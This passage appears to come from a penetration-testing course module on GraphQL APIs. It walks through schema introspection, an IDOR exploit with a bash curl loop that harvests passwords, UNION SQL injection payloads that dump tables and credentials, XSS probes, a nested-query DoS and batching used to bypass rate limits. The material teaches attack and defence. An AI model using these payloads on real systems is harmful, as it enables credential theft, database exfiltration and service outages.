Knowing every supported query helps us identify potential attack vectors for obtaining sensitive information. This is how we discover queries like `user`, `post`, and `postByAuthor` that we later test for injection. Each query name is a candidate to probe: we will call each one, see which arguments it demands, and test those arguments. A query such as `user` that takes a `username` argument is a prime IDOR and SQL-injection target; a query such as `postByAuthor` that takes an `author` argument is another. The query list, in other words, is our to-do list for the rest of the engagement.

#### Full Introspection Query

Lastly, this "general" introspection query dumps **all** information about types, fields, and queries supported by the backend in one shot:

```graphql
query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
```

How this query is built:
- The `IntrospectionQuery` asks `__schema` for the root query, mutation, and subscription types, all `types`, and all `directives`.
- `fragment FullType` is a reusable block that pulls every field, input field, interface, enum value, and possible type for each type — `fragment` keeps the query from repeating itself.
- `fragment TypeRef` is nested many levels deep (`ofType` inside `ofType`) so it can fully resolve wrapped types like `[String!]!` (lists of non-null values).

A little more on the mechanics, since this query looks intimidating. A **fragment** is a named, reusable selection set: instead of writing the same long list of fields in three places, we define it once (`fragment FullType on __Type { ... }`) and reference it with the spread syntax `...FullType`. The three fragments here cover three jobs: `FullType` describes a type completely, `InputValue` describes an argument or input field (its name, type, and default), and `TypeRef` resolves what a type actually *is* when it is wrapped. The deep `ofType` nesting in `TypeRef` exists because GraphQL wraps types in layers — `[String!]!` is a non-null list of non-null strings, which is `NON_NULL → LIST → NON_NULL → SCALAR(String)`. Each `ofType` peels one layer, so seven levels of nesting handle even heavily wrapped types. We rarely need to understand every line — we just paste it, run it, and feed the result into a visualizer.

#### Visualizing with GraphQL-Voyager

The result of the full introspection query is large and complex. We can visualize the schema with the tool **GraphQL-Voyager**. For this module we use the GraphQL Demo, but in a real engagement we should host the tool ourselves (per the GitHub instructions) so **no sensitive information leaves our system**.

The warning about hosting it ourselves is a genuine operational-security point, not boilerplate. The public Voyager demo runs on a third-party website; if we paste a real client''s introspection result into it, we have just sent that client''s complete internal API schema — field names, hidden admin queries, data relationships — to someone else''s server. On a paid engagement that could breach the scope agreement and leak sensitive design information. Cloning the Voyager repository and running it locally keeps the schema on our own machine. The rule of thumb: enumeration data from a real target never leaves our control.

Steps to visualize:
1. In the demo, click **CHANGE SCHEMA** and select **INTROSPECTION**.
2. Paste the result of the full introspection query into the text field.
3. Click **DISPLAY**.

The backend''s GraphQL schema is then drawn for us. We can explore all supported queries, types, and fields. In this app it shows three tables — `Query` (with `users`, `posts`, `user`, `postByAuthor`, `post`), `UserObject` (with `uuid`, `id`, `username`, `password`, `role`, `msg`, `posts`), and `PostObject` (with `uuid`, `id`, `title`, `body`, `category`, `authorId`, `author`) — with arrows showing their relationships. This map is what we reference for the SQL injection and DoS attacks later.

Reading the diagram like an attacker: the arrows are relationships, and relationships are opportunities. The arrow from `UserObject.posts` to `PostObject` and back from `PostObject.author` to `UserObject` is the **loop** we weaponize for DoS in Section 5. The six scalar fields on `UserObject` (`uuid`, `id`, `username`, `password`, `role`, `msg`) are the **column count** we need for the UNION SQL injection in Section 4. And the `password` and `role` fields jump out as sensitive — `password` for credential theft, `role` for privilege escalation. A good habit is to annotate this diagram before touching the target, marking each sensitive field and each loop, so the rest of the test is just executing a plan.

#### Enumeration Without Introspection (Fallback)

It is worth preparing for the case where introspection is **disabled**, because mature targets often turn it off. When the full-schema dump is blocked, several fallback techniques still leak structure piece by piece, and knowing them keeps an engagement moving instead of stalling at the first locked door.

The first fallback is **field suggestions**. Many engines (Graphene among them, as the threat matrix told us) respond to a misspelled field by suggesting the correct one — an error like `Cannot query field "passw" on type "UserObject". Did you mean "password"?`. By feeding partial or near-miss field names, we coax the server into confirming real field names one at a time. It is slower than introspection but often just as effective for the handful of fields we actually care about.

The second fallback is **error-driven argument discovery**, which we already met in Section 4''s preview: sending a query with missing or wrongly-typed arguments makes the validator name the expected argument and its type. Looping candidate query names through this technique maps out the callable queries and their inputs even with introspection off.

The third fallback is a **wordlist/brute-force** approach using tools such as Clairvoyance, which repeatedly abuse field suggestions to rebuild a surprisingly complete schema automatically. The takeaway: disabling introspection raises the cost of recon but does not make it impossible, which is exactly why Section 8 treats introspection-off as one layer of defense in depth rather than a complete fix.

#### Putting Section 2 Together (Worked Flow)

To consolidate, here is the end-to-end recon flow as we would actually run it against the sample app, in order, so the individual queries above connect into one narrative:

1. Observe `/graphql` traffic in the browser or proxy → confirm GraphQL is in use.
2. Run `graphw00f` → engine is **Graphene**, introspection likely on, no depth limit, batching off by default.
3. Open `/graphql` in the browser → **GraphiQL** loads, confirming introspection and giving us an editor.
4. Run the "all types" query → spot `UserObject`, `PostObjectConnection`, `PageInfo`.
5. Run the "fields of `UserObject`" query → find `username`, `password`, `role` (sensitive!).
6. Run the "all queries" query → find `users`, `posts`, `user`, `postByAuthor`, `post`.
7. Run the full introspection query → paste into **Voyager** → see the `UserObject ↔ PostObject` loop.
8. Write down the plan: IDOR on `user(username:)`, SQLi on `user`/`postByAuthor` string args, DoS on the loop.

Every later section is just executing one line of this plan, which is why thorough enumeration up front makes the exploitation phase fast and almost mechanical.

---

## Section 3: Insecure Direct Object Reference (IDOR)

Like REST APIs, broken authorization — particularly **Insecure Direct Object Reference (IDOR)** — is a common security issue in GraphQL. (For the full theory on IDOR, see the Web Attacks module.) The core cause is the same: the backend does not properly check whether the requesting user is allowed to access the data they ask for.

IDOR in GraphQL looks a little different from REST but has the identical root cause. In REST we change `?uid=1` to `?uid=2`; in GraphQL we change an **argument** inside the query, such as `user(username: "me")` to `user(username: "someone_else")`. In both cases the server happily returns the other user''s data because it checks only that we are logged in, not that we are *allowed* to see that specific record. GraphQL can even make IDOR worse, because introspection has already told us the exact field names (`password`, `role`) to request once we reach another user''s object. So the schema we mapped in Section 2 directly feeds the exploitation here.

Two forms of broken authorization are worth distinguishing, because they need different tests. **Object-level** authorization failures are the classic IDOR: we are allowed to call the `user` query, but the server fails to check *which* user''s record we are asking for, so we read records that are not ours. **Function-level** (or operation-level) authorization failures are different: we are not supposed to be able to call a given query or mutation *at all* (say, an admin-only report or a `deleteUser` mutation), but the server never checks our role before running it. GraphQL exposes both because introspection reveals admin-only operations that the UI hides from normal users — and if the backend relies on the UI to hide them rather than enforcing authorization server-side, simply calling the operation directly succeeds. When testing, we probe both: change identifiers to test object-level access, and call privileged-looking operations to test function-level access.

### Identifying IDOR

Enumerating the web application, we observe that a GraphQL query is sent when we access our user profile. The query fetches user data for the **username provided in the query**. While the app automatically queries the data for the user we logged in with, we should check if we can access **other** users'' data.

The tell-tale sign of a possible IDOR is that the object we want is selected by a value **we control** — here, a `username` argument that the frontend fills in with our own name. The question every IDOR test asks is simple: "the app sends my identifier to fetch my data; what happens if I send someone else''s identifier instead?" If the backend has proper authorization, we get an "access denied" or an empty result. If it does not, we get their data. Because the identifier travels inside the query body (not a session token the server controls), it is entirely under our control to change.

To test, we provide a different username we know exists: `test`. Note that when sending this through a raw HTTP request, we need to **escape the double quotes** inside the GraphQL query so we do not break the JSON syntax (e.g. `\"test\"`). The query returns user `test`''s data **without any additional authorization checks**, confirming a lack of authorization in this GraphQL query.

The quote-escaping detail is a frequent source of frustration, so it is worth being precise. When the GraphQL query travels inside a JSON body (`{"query":"..."}`), the inner double quotes around `test` would prematurely close the JSON string, so they must be escaped as `\"test\"`. Inside GraphiQL this is not an issue because we type raw GraphQL with no surrounding JSON. This is one more reason the "discover in GraphiQL, weaponize in Burp" workflow is handy: we prove the IDOR cleanly in GraphiQL first, then handle escaping when we move the finished query into a scripted request.

### Exploiting IDOR

To demonstrate impact, we identify what data can be accessed without authorization. We use an introspection query to list all fields of the `User` type:

```graphql
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

This is the same type-introspection query from Section 2, reused here with a purpose: now that we know we can reach *any* user''s object, we want to know *which fields* that object exposes, so we can ask for the most damaging ones. Identifying a vulnerability is only half the job; demonstrating **impact** is what makes a finding matter to a client. Listing the fields turns "I can read another user''s object" into "I can read another user''s password," which is a far more serious, concrete result.

The result shows the `User` object contains a `password` field. We then adjust the initial query to add the `password` field for another user:

```graphql
{
  user(username: "test") {
    username
    password
  }
}
```

Combining the two findings is the whole attack in one query: the `user(username: "test")` part is the **broken authorization** (we are reading someone else''s object), and the `password` field in the selection set is the **over-exposed field** (the backend never strips it). Neither alone would be as severe — authorization bypass on a record with no sensitive fields is low-impact, and an exposed `password` field we can only read for ourselves is harmless — but together they produce full credential disclosure.

From the result, we successfully obtain another user''s **password** — proving the IDOR vulnerability has real impact (credential disclosure for any user whose username we know). Because the only input is a username (often guessable, enumerable, or public), this scales: we could script a loop over a list of usernames and harvest every password in the system, exactly as we did with uid loops in the Web Attacks module. That turns a single-record bug into a full-database compromise, which is why IDOR consistently ranks among the highest-impact web vulnerabilities.

#### Scripting Mass IDOR Extraction

To show how the single-record bug becomes a bulk harvest, consider how we would automate it with `curl`. The query travels inside a JSON body, so the inner quotes are escaped, and we loop over a list of usernames:

```bash
#!/bin/bash
# Harvest username/password for a list of candidate users via the IDOR
for u in admin test htb-stdnt vautia; do
  curl -s "http://TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"{ user(username: \\\"$u\\\") { username password } }\"}"
  echo
done
```

Command and payload explained:
- `for u in admin test ...` loops over each candidate username; in a real run this would be a wordlist piped with `cat users.txt | while read u; do ...`.
- `curl -s` sends the request quietly; `-H "Content-Type: application/json"` tells the server the body is JSON (required for most GraphQL endpoints).
- `-d "{\"query\":\"...\"}"` is the JSON body. The GraphQL query sits inside the `"query"` string, so its own double quotes around `$u` must be escaped as `\\\"` — two layers of escaping because the value passes through both the shell and JSON.
- `echo` prints a newline between responses so the harvested records are readable.

The output is one JSON object per user, each containing that user''s `username` and `password`. This is the GraphQL equivalent of the uid download loops from the Web Attacks IDOR module — the mechanism differs (an argument instead of a URL parameter), but the outcome is identical: bulk extraction of records we were never authorized to see.

#### Why GraphQL IDOR Is Easy to Miss in Testing

A practical note for both attackers and defenders: because every GraphQL request hits the *same* `/graphql` endpoint with the *same* HTTP method, an IDOR here does not show up as a suspicious new URL the way `GET /documents.php?uid=2` would in REST. The only thing that changes between a legitimate request and the attack is a value buried inside the JSON body. This makes GraphQL IDOR harder to spot in server logs, harder to block with URL-based WAF rules, and easier for developers to overlook — all of which contribute to IDOR being so pervasive in GraphQL APIs. The defensive consequence (Section 8) is that authorization must be enforced inside the **resolver**, per object, because perimeter controls that key off URLs and verbs simply cannot see the difference.

---

## Section 4: Injection Attacks

One of the most common web vulnerability classes is injection — SQL Injection, Cross-Site Scripting (XSS), and Command Injection. Like all web applications, GraphQL implementations can also be vulnerable to these, because GraphQL arguments ultimately feed into backend code and queries.

A useful way to frame injection in GraphQL: GraphQL is just a *transport* for our input. Whatever we put in an argument eventually reaches backend code — a SQL query, an OS command, an HTML template, a file path. GraphQL does not sanitize that input for the developer; it only validates the **type** (string, int, etc.). So if a resolver drops an argument straight into a SQL string, GraphQL''s type checking does nothing to stop a SQL injection hidden inside a string argument. This is why the same injection classes that plague REST and classic web apps apply unchanged here — we are simply delivering the payload through a GraphQL argument instead of a URL parameter or form field.

A subtle point that trips people up: GraphQL''s strong typing gives a *false* sense of security. Because the schema declares `username: String` and `id: Int`, developers sometimes assume the framework is validating input for them. But "is this a string?" is not "is this a *safe* string?" — a perfectly valid `String` can contain `'' UNION SELECT ...`. Type validation stops us from sending a string where an integer is required (which is why integer arguments resist SQLi), but it does nothing about malicious *content* inside a correctly-typed value. Recognizing this gap tells us exactly where to aim: **string arguments** for SQLi and command injection, and **type-strict arguments** for error-reflected XSS. The type system is a hint about which attack fits each argument, not a wall against any of them.

### SQL Injection

Since GraphQL is a query language, its most common use is fetching data from storage — usually a database. As SQL databases are so common, SQL injection can occur in GraphQL APIs that do not properly sanitize user input from **arguments** before using them in SQL queries. So we should investigate all GraphQL queries, check whether they support arguments, and test those arguments for SQL injection.

The methodology mirrors classic SQL injection testing, just delivered through GraphQL. For each query that takes a string argument, we: (1) confirm the argument reaches a SQL query, (2) break the query''s syntax to prove injection, (3) read the resulting SQL error for structure, and (4) build a UNION payload to exfiltrate data. The one GraphQL-specific twist is step 4''s **column counting**: instead of guessing with `ORDER BY`, we can often read the exact column count straight off the introspection map, because the object''s scalar fields line up with the table''s columns. That shortcut, courtesy of introspection, makes GraphQL SQLi faster to exploit than the blind REST equivalent.

A short catalogue of probe payloads to try in a string argument, roughly in order of how much they reveal:

- `''` — a single quote. If it causes a SQL error, injection is confirmed and the error may leak the query.
- `'' --` or `''-- -` — close the string and comment out the rest; if the original result still returns, the input is being parsed as SQL.
- `'' OR ''1''=''1` — a classic always-true test; may return extra rows if the argument feeds a `WHERE` clause.
- `'' UNION SELECT NULL-- -` — begin column-count discovery if introspection did not already give it (add `NULL`s until the error clears).
- `'' UNION SELECT 1,2,3,4,5,6-- -` — once the count is known, confirm which column reflects into the field we read back.

Working through these in sequence turns "maybe injectable" into a precise understanding of the query''s shape, after which the `GROUP_CONCAT` exfiltration payloads do the actual data theft. The same probes apply to every injectable string argument in the API, so once one is confirmed it is worth re-testing the others with the knowledge gained.

#### Finding Queries That Take Arguments

Using the introspection query (plus some trial and error), we find the backend supports these queries that require arguments: `post`, `user`, and `postByAuthor`.

Arguments are the prerequisite for injection, so the first job is simply to list which queries accept them and what type each argument is. A **string** argument (like `username` or `author`) is the most promising SQLi candidate because string values are concatenated into SQL with surrounding quotes we can try to break out of. An **integer** argument (like `post`''s `id`) is less likely to be string-injectable but becomes interesting for XSS, because sending a non-integer value often triggers a type error that reflects our input — which is exactly the XSS vector we test later in this section.

To tell whether a query requires an argument, send it **without** arguments and read the response. If the backend expects an argument, the error names the required argument. For example, an error tells us the `postByAuthor` query requires the `author` argument:

```
Field "postByAuthor" argument "author" of type "String" is required but not provided.
```

This is a neat enumeration trick in its own right: deliberately sending a *wrong* or *incomplete* query makes GraphQL''s validator tell us the correct shape. Here it leaks both the argument name (`author`) and its type (`String`). Even on targets where full introspection is disabled, this error-driven discovery often still works, because the validator must describe what it expected in order to reject the request. So "break the query and read the error" is a reliable fallback recon technique throughout GraphQL testing.

After supplying the `author` argument (e.g. `author: "admin"`), the query runs successfully and returns posts. We then test each argument for injection. Now that the query runs cleanly with a valid value, we have a baseline response to compare against — essential for spotting the subtle differences (an extra row, a missing row, an error) that reveal injection. With the baseline established, we start mutating the argument value with injection probes.

#### Confirming the Vulnerability

Testing `postByAuthor` with a basic payload (`author: "admin --"`) returns `null` — not obviously injectable. Moving to the `user` query, the same style of payload still returns the previous result, which **hints** at SQL injection:

```graphql
{
  user(username: "htb-stdnt'' --") {
    uuid
    username
    role
  }
}
```

The reasoning behind trying the comment payload (`'' --`) is classic SQLi logic: the single quote tries to close the string the backend wrapped our value in, and `--` comments out whatever SQL follows. If the query still returns the correct user *despite* the appended `'' --`, that strongly suggests our input is being parsed as SQL rather than treated as a literal username — because a literal username of `htb-stdnt'' --` does not exist, yet we still got `htb-stdnt` back. That mismatch between "this username shouldn''t match anything" and "it matched anyway" is the hint that we have broken out of the intended query. Note that `postByAuthor` returning `null` to the same probe is a reminder that not every argument is injectable even within the same API — we test each one.

To confirm, we inject a single quote. The response contains a **SQL error**, confirming the vulnerability (the input is breaking out of the SQL string). Because the SQL query appears in the error, we can see the structure and build a UNION-based injection. A single unbalanced quote is the most reliable SQLi confirmation test: a non-vulnerable app treats it as a harmless character, but a vulnerable one passes it into SQL where it creates a syntax error. Getting that error back — especially one that echoes the SQL statement — is doubly useful: it confirms the bug **and** reveals the query structure (how many columns, what the `WHERE` clause looks like) that we need to craft the UNION payload. Verbose SQL errors are a gift; they turn blind injection into a visible one.

#### UNION-Based Exfiltration

Since the error reveals the SQL query, we can construct a **UNION-based SQL injection** to exfiltrate data — including data not exposed through the GraphQL API at all. We reference the introspection map: the vulnerable `user` query returns a `UserObject` with **six fields** (`uuid`, `id`, `username`, `password`, `role`, `msg`), so our UNION payload needs **six columns** to match the original query.

This is the GraphQL-specific efficiency gain worth dwelling on. In a normal web-app SQLi we usually spend several requests discovering the column count with `ORDER BY 1`, `ORDER BY 2`, and so on, or with `UNION SELECT NULL,NULL,...` until the error disappears. In GraphQL we often skip that entirely: the object the vulnerable query returns maps one-to-one onto the underlying table''s columns, so the six fields we already saw during introspection tell us to use **six** UNION columns on the first try. Enumeration done early pays off directly during exploitation.

Key idea: the field we request in the GraphQL query maps to its column position in the UNION. For example, `username` is the **third** field, so whatever we place in the **third** column of our UNION is what gets reflected when we query `username`.

This positional mapping is the trick that makes the attack practical. We can only read back a field that the GraphQL query actually selects, so we choose one reliable "output channel" — here, `username`, the third field — and put our stolen data in the matching **third** column of the `UNION SELECT`. The other five columns can be dummy values (`1,2,...,6`) because we are not reading them. If we wanted to read data back through a different field, we would move our payload to that field''s column position instead. Think of it as choosing which pipe to pour the data into and making sure the data sits in the matching slot.

Because the query only returns the first row, we use `GROUP_CONCAT` to pull many rows at once. This payload exfiltrates all table names in the current database:

```graphql
{
  user(username: "x'' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}
```

Payload explained:
- `x''` closes the original string and leaves no matching user (so only our injected row returns).
- `UNION SELECT 1,2,...,6` adds our own row with six columns to match the query.
- `GROUP_CONCAT(table_name)` is placed in the **third** column because we are reading it back through the `username` field (the third field).
- `FROM information_schema.tables WHERE table_schema=database()` reads table names for the current database only.
- `-- -` comments out the rest of the original query.

Two details deserve extra attention. First, `x''` is deliberately a username that will not exist — by matching **zero** real rows, we guarantee the only row in the result is the one our `UNION` injects, so our stolen data is not buried among legitimate users. Second, `GROUP_CONCAT` solves the "GraphQL returns only the first row" problem: normally a UNION returns many rows, but the resolver shows us just one, so we would see only one table name. `GROUP_CONCAT` collapses every matching row into a single comma-separated string in one cell, letting us read them all through that single returned field. The `information_schema.tables` source with `table_schema=database()` scopes the dump to the current database''s tables, which is the standard first step of SQLi data discovery.

The response contains all table names concatenated in the `username` field:

```graphql
{
  "data": {
    "user": {
      "username": "user,secret,post"
    }
  }
}
```

From here it is a standard SQL injection — we can enumerate column names and exfiltrate data using any SQL payloads and techniques (see the SQL Injection Fundamentals and Advanced SQL Injections modules). Note the `secret` table is not exposed through GraphQL, which is exactly the kind of hidden data this attack reaches. This is the crucial payoff: the `secret` table has **no** corresponding GraphQL type or query, so no amount of introspection or normal querying would ever reveal it — yet SQL injection reaches it directly at the database layer, underneath the GraphQL abstraction. The lesson is that the GraphQL schema shows only what the developers chose to expose, while SQLi exposes the entire database. The next moves follow standard SQLi: dump the `secret` table''s columns from `information_schema.columns`, then `GROUP_CONCAT` the sensitive columns to read their values.

To make the follow-up concrete, here are the two next payloads in the same positional-reflection style. First, enumerate the columns of the hidden `secret` table:

```graphql
{
  user(username: "x'' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM information_schema.columns WHERE table_name=''secret''-- -") {
    username
  }
}
```

- `information_schema.columns WHERE table_name=''secret''` lists every column in the `secret` table.
- `GROUP_CONCAT(column_name)` collapses them into one comma-separated value, read back through the third column → the `username` field.

Then, assuming the columns turn out to be `username` and `password`, dump the actual secret data:

```graphql
{
  user(username: "x'' UNION SELECT 1,2,GROUP_CONCAT(username,0x3a,password),4,5,6 FROM secret-- -") {
    username
  }
}
```

- `GROUP_CONCAT(username,0x3a,password)` joins each row''s username and password with `0x3a` (the hex code for a colon `:`), so the output reads `alice:hash1,bob:hash2,...` in one field.
- Using the hex `0x3a` instead of a literal `'':''` avoids introducing another quote that could break our already-quoted injection — a handy trick whenever a payload needs a separator character.

This three-step rhythm — tables, then columns, then values — is the backbone of every UNION-based SQLi, and GraphQL changes none of it except the delivery vehicle (a query argument) and the column-count shortcut (read off introspection).

### Cross-Site Scripting (XSS)

XSS can occur if GraphQL responses are inserted into the HTML page without proper sanitization. As with SQL injection, we test any GraphQL arguments for XSS injection points. In this app, injecting a `<script>` payload into the `user` query''s `username` argument returns `null` — no reflection there.

The thinking here is that XSS is ultimately about our input ending up in HTML that a browser renders. GraphQL responses are JSON, which a browser does not execute as HTML on its own — so a reflected XSS requires that some part of the app later drops our value into a page without encoding it. We therefore test both the normal data path (does our payload come back in a field value?) and the error path (does our payload come back in an error message?). The `user` query returning `null` for a `<script>` username means our payload is not reflected through that data path, so we pivot to the error path.

XSS can also occur when **invalid arguments are reflected in error messages**. The `post` query requires an **integer** `id`. If we instead submit a string argument containing an XSS payload, the payload is reflected **without proper encoding** in the GraphQL error message:

```
Invalid id value, expected type "Int".
```

The reason the integer argument is the better XSS candidate is precisely that it is *strict about type*: feeding a string where an integer is expected forces a type-validation error, and that error message often echoes the offending value back verbatim to help the developer debug. If the framework builds that error by string-concatenating our raw input without HTML-encoding it, our `<script>` payload survives into the message. So the very strictness that makes integer arguments poor SQLi targets makes them good error-reflection targets.

However, when we try to trigger it via the GET parameter by visiting `/post?id=<script>alert(1)</script>`, the page simply breaks and the payload does **not** fire. So the reflection exists, but it is not exploitable as XSS in this case — a good reminder that reflection alone does not always mean a working exploit. This is an important, honest point for a tester: a reflected value is a *potential* XSS, not a *confirmed* one. For XSS to execute, the reflection must land in an HTML context where the browser parses it as markup, with the right content type and no encoding or Content-Security-Policy stopping it. Here those conditions are not met, so we report it as reflected-but-not-exploitable rather than overclaiming. Chasing reflections to a real proof-of-concept — and admitting when one does not pan out — is what separates accurate findings from noise.

The deeper reason GraphQL XSS so often fizzles is the **content type**. A GraphQL endpoint returns `application/json`, and browsers do not parse JSON as HTML, so a `<script>` sitting in a JSON response is inert — it is just text in a data file. For the reflection to become live XSS, that JSON value must be read by some *other* part of the application and written into an HTML page without encoding: a frontend that renders an error message straight into the DOM, a server-side template that embeds a GraphQL result, or an admin dashboard that displays user-supplied fields. So the realistic hunt for GraphQL-driven XSS is not "does the endpoint reflect my payload?" but "where does this reflected value get *rendered* downstream?" That shifts the testing effort from the API response itself to the pages that consume it — which is exactly why a GraphQL reflection is a lead to follow, not a finding to file on its own.

---

## Section 5: Denial-of-Service (DoS) & Batching Attacks

Depending on the GraphQL API''s configuration, we can craft queries that produce exponentially large responses, requiring heavy resources to process. These can drive high hardware usage on the backend, potentially causing a Denial-of-Service (DoS) that limits availability for other users.

These two attacks share a theme — abusing GraphQL''s flexibility to do far more work per request than the designers intended — but they differ in mechanism. **DoS** abuses query *depth*: one request that nests a relationship loop so deeply the server exhausts memory or CPU building the response. **Batching** abuses query *count*: one request that bundles hundreds or thousands of separate operations, which among other things defeats per-request rate limits. Both turn a single HTTP request into a disproportionate amount of server work, and both are prevented by the same family of defenses (depth limits, cost analysis, batching limits) covered in Section 8.

### Denial-of-Service (DoS) Attacks

To cause DoS, we need a query that yields a huge response. Looking at the GraphQL Voyager visualization, we can spot a **loop** between `UserObject` and `PostObject` via the `author` and `posts` fields. This circular relationship is the weakness we abuse.

The loop is the whole key, so it is worth stating plainly: a `UserObject` has a `posts` field (the posts they authored), and each `PostObject` has an `author` field (back to a `UserObject`). That means from a user we can reach their posts, from each post we can reach its author, from that author we can reach *their* posts, and so on — forever. Each hop multiplies the amount of data the server must resolve and serialize. Without a depth limit, there is nothing to stop us from asking the server to walk this loop dozens of times in a single query, and the work grows roughly exponentially with each level.

We exploit the loop by querying the author of all posts; for each author, we query all their posts again; and we repeat. Each repetition grows the result exponentially. Because `posts` is a **connection**, we must specify `edges` and `node` to reach the underlying `Post` object. A small example (query the author of all posts → all posts by each author → each author''s username):

```graphql
{
  posts {
    author {
      posts {
        edges {
          node {
            author {
              username
            }
          }
        }
      }
    }
  }
}
```

The `edges`/`node` wrapping is a GraphQL pagination convention (the "Relay connection" pattern) that we saw hinted at by the `PostObjectConnection` type during introspection. A connection does not hand back a plain list of posts; it wraps them in `edges` (one per item) each containing a `node` (the actual object). So to traverse from a user''s `posts` connection down to the real `PostObject` and then to its `author`, we must step through `edges { node { author { ... } } }`. Recognizing that a field is a connection (because its type name ends in `Connection`) tells us in advance that we will need this `edges`/`node` boilerplate to keep the loop going.

This is effectively an infinite loop we can repeat as many times as we like. Even this short version already returns a large response, since it grows exponentially with each added loop. Making the query deep enough significantly slows the server and can cause availability problems for other users. The following deeply nested query crashes the GraphiQL instance entirely:

```graphql
{
  posts {
    author {
      posts {
        edges {
          node {
            author {
              posts {
                edges {
                  node {
                    author {
                      posts {
                        edges {
                          node {
                            author {
                              posts {
                                edges {
                                  node {
                                    author {
                                      posts {
                                        edges {
                                          node {
                                            author {
                                              posts {
                                                edges {
                                                  node {
                                                    author {
                                                      posts {
                                                        edges {
                                                          node {
                                                            author {
                                                              username
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

The browser returns an "Aw, Snap!" crash page — the response grew too large to handle. This is why query-depth limits are an important defense (covered in Prevention). A practical caution for real engagements: an uncontrolled DoS against a production system can genuinely take the service down and harm real users, which is usually out of scope and potentially unlawful without explicit permission. In authorized testing we typically demonstrate the *capability* with a moderately deep query that measurably slows the response (showing increasing response time with each added level), rather than hammering the server until it falls over. The finding we report is "the API accepts unbounded query depth," evidenced by rising latency, which is enough to prove the risk without causing an actual outage.

A safe way to measure that rising latency is to time a few queries of increasing depth and watch the response time climb:

```shellsession
# Time a shallow vs a deeper nested query to prove depth cost (adjust the body per level)
curl -s -o /dev/null -w "depth-2: %{time_total}s\n" \
  -H "Content-Type: application/json" \
  -d ''{"query":"{ posts { author { username } } }"}'' \
  http://TARGET/graphql
```

- `-o /dev/null` discards the (potentially huge) response body so it does not flood the terminal.
- `-w "%{time_total}s\n"` prints only curl''s measured total request time.
- Re-running with progressively deeper `posts → author → posts` nesting shows the time growing roughly exponentially — clear, non-destructive evidence of missing depth limits.

#### Related DoS Amplifiers (from the GraphQL-Cop Report)

The nested loop is the clearest DoS, but GraphQL-Cop (Section 7) flags several sibling techniques that abuse the same "one request, huge work" idea, and it is worth recognizing them:

- **Alias overloading** — GraphQL lets us rename a field with an alias (`a: user{...}`), and we can request the *same* expensive field hundreds of times under different aliases in one query, multiplying the work.
- **Field duplication** — repeating the same field hundreds of times in a selection set forces the server to resolve it repeatedly.
- **Directive overloading** — stacking many duplicated directives (`@include`, `@skip`, …) on a field can force excess processing in some engines.

All three are variations on the depth-DoS theme and are prevented by the same cost-analysis and query-size limits, which is why GraphQL-Cop groups them together under "Denial of Service."

### Batching Attacks

Batching in GraphQL means executing **multiple queries in a single request**, done by supplying several queries in a JSON list. For example, we can query the admin user''s ID and the first post''s title in one request:

```http
POST /graphql HTTP/1.1
Host: 172.17.0.2
Content-Length: 86
Content-Type: application/json

[
    {
        "query":"{user(username: \"admin\") {uuid}}"
    },
    {
        "query":"{post(id: 1) {title}}"
    }
]
```

The structural detail that makes batching work is the **JSON array** at the top level of the request body (the `[ ... ]` wrapping two `{"query": "..."}` objects). A normal GraphQL request sends a single JSON object; a batched request sends a list of them, and a batching-enabled server executes each in turn and returns a matching list of results. Note the escaped quotes (`\"admin\"`) again — because each GraphQL query is a JSON string, its inner quotes must be escaped. Sending this array and getting an array back is the quick test for whether batching is enabled at all.

The response returns both results in the same structure/order we sent them (e.g. user `uuid` "3" and post `title` "Lorem ipsum 1"). The one-to-one, order-preserving mapping between the queries we send and the results we get back is what makes batching convenient for developers — and dangerous for defenders. Because the server processes the whole array within a single HTTP request, any control that counts **requests** (like a rate limiter) sees just one hit no matter how many operations the array contains.

Batching itself is **not** a vulnerability — it is an intended feature that can be enabled or disabled. But it becomes a security issue when GraphQL queries handle sensitive processes like **login**. Because batching lets an attacker send many queries in one HTTP request, it can power **brute-force attacks** with far fewer HTTP requests, bypassing defenses like rate limits.

It is worth being precise that batching is a *design feature*, not a bug — calling it a vulnerability outright would be inaccurate. The risk arises from the **combination** of batching plus a security-sensitive operation (login, password reset, coupon redemption, one-time-code verification) that is protected only by a per-request rate limit. In that pairing, batching quietly removes the protection, because the rate limiter was counting the wrong thing (requests) while the attacker multiplies the thing that matters (attempts) inside each request. The fix, as Section 8 notes, is to limit the number of operations per batch, or disable batching on sensitive endpoints, or rate-limit by attempts rather than by requests.

Worked example: suppose a login endpoint is rate-limited to **5 requests per second**. Normally that caps brute-forcing at 5 passwords/second. But if the attacker packs **1000 login queries** into one HTTP request via batching, they now test up to **5000 passwords/second** — making the rate limit useless. This is why batching should be disabled where possible. To make the arithmetic explicit: the limiter still allows only 5 *requests* per second, but each request now carries 1000 login *attempts*, so 5 × 1000 = 5000 attempts per second slip through. The rate limit was never actually bypassed — it simply counted HTTP requests while the attacker scaled attempts-per-request, a dimension the limiter never measured. This mismatch between "what we limit" and "what the attacker scales" is the general pattern behind many rate-limit bypasses, and batching is GraphQL''s built-in way to create it.

